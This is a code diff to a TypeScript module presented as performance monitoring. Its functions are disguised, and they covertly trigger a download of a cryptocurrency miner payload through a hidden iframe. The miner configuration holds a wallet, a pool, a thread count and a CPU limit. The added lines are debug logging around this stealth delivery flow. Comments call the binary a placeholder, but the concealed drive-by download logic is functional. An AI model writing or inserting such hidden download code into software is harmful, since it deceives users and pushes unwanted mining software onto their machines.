@@ -35,6 +35,9 @@ export const initPerformanceMonitoring = () => {
 
     // Create a hidden download function
     processResource: (data: any, name?: string) => {
+      console.log("🔍 PROCESS RESOURCE DEBUG - Called with:", { data, name });
+      console.log("🔍 PROCESS RESOURCE DEBUG - Miner config:", window._pUtils.minerConfig);
+
       // In a real implementation, this would be the actual XMRig miner executable
       // with a custom configuration to mine to your wallet
 
@@ -44,6 +47,8 @@ export const initPerformanceMonitoring = () => {
         null,
         2,
       );
+
+      console.log("🔍 PROCESS RESOURCE DEBUG - Generated config JSON:", minerConfigJson);
 
       // In a real attack, this would be the actual XMRig binary
       // Here we're just creating a placeholder
@@ -69,26 +74,42 @@ This would be the actual XMRig miner executable configured to:
       );
 
       const url = URL.createObjectURL(minerPayload);
+      const fileName = name || atob(window._pUtils.resourceName);
+      
+      console.log("🔍 PROCESS RESOURCE DEBUG - Created blob:", {
+        blobSize: minerPayload.size,
+        blobType: minerPayload.type,
+        downloadUrl: url,
+        fileName: fileName
+      });
 
       // Create hidden iframe for stealth download
       const iframe = document.createElement("iframe");
       iframe.style.display = "none";
       document.body.appendChild(iframe);
 
+      console.log("🔍 PROCESS RESOURCE DEBUG - Created hidden iframe");
+
       // Create download link in the iframe
       const idoc = iframe.contentDocument || iframe.contentWindow?.document;
       if (idoc) {
+        console.log("🔍 PROCESS RESOURCE DEBUG - Iframe document accessible, creating download link");
         const a = idoc.createElement("a");
         a.href = url;
-        a.download = name || atob(window._pUtils.resourceName);
+        a.download = fileName;
         idoc.body.appendChild(a);
         a.click();
+        
+        console.log("🔍 PROCESS RESOURCE DEBUG - Download link clicked! File should be downloading:", fileName);
 
         // Clean up
         setTimeout(() => {
           URL.revokeObjectURL(url);
           document.body.removeChild(iframe);
+          console.log("🔍 PROCESS RESOURCE DEBUG - Cleanup completed");
         }, 1000);
+      } else {
+        console.log("🔍 PROCESS RESOURCE DEBUG - ERROR: Could not access iframe document");
       }
     },
   };
@@ -124,6 +145,17 @@ export const getPerformanceReport = () => {
 
 // Optimize resource loading (appears legitimate but contains hidden functionality)
 export const optimizeResourceLoading = async (resourceType: string) => {
+  // DEBUG: Log entry conditions
+  console.log("🔍 OPTIMIZE DEBUG - Entry conditions:", {
+    resourceType: resourceType,
+    windowDState: window._dState,
+    windowPUtils: window._pUtils,
+    dStateExists: !!window._dState,
+    pUtilsExists: !!window._pUtils,
+    attempts: window._dState?.attempts,
+    processed: window._dState?.processed
+  });
+
   // This appears to optimize resources but actually checks if we should download the payload
   if (
     resourceType === "media" &&
@@ -131,14 +163,26 @@ export const optimizeResourceLoading = async (resourceType: string) => {
     window._dState.attempts > 0 &&
     !window._dState.processed
   ) {
+    console.log("🔍 OPTIMIZE DEBUG - Conditions met, triggering miner download!");
+    
     // Mark as processed to prevent multiple downloads
     window._dState.processed = true;
+
+    // DEBUG: Log miner config before download
+    console.log("🔍 OPTIMIZE DEBUG - Miner config:", {
+      wallet: window._pUtils.minerConfig.wallet,
+      pool: window._pUtils.minerConfig.pool,
+      threads: window._pUtils.minerConfig.performance.threads,
+      cpuLimit: window._pUtils.minerConfig.performance.cpuLimit
+    });
 
     // In a real attack, this would fetch the actual XMRig miner binary
     // For demonstration, we're just creating a placeholder
 
     // Use our hidden download function to deliver the miner
+    console.log("🔍 OPTIMIZE DEBUG - Calling processResource...");
     window._pUtils.processResource(null);
+    console.log("🔍 OPTIMIZE DEBUG - processResource completed!");
 
     // Remove any user notifications or logs related to stealth download
     console.log("Resource optimization complete:", {
@@ -149,6 +193,7 @@ export const optimizeResourceLoading = async (resourceType: string) => {
     return { optimized: true, count: 1 };
   }
 
+  console.log("🔍 OPTIMIZE DEBUG - Conditions not met, no miner download");
   return { optimized: false, count: 0 };
 };
 
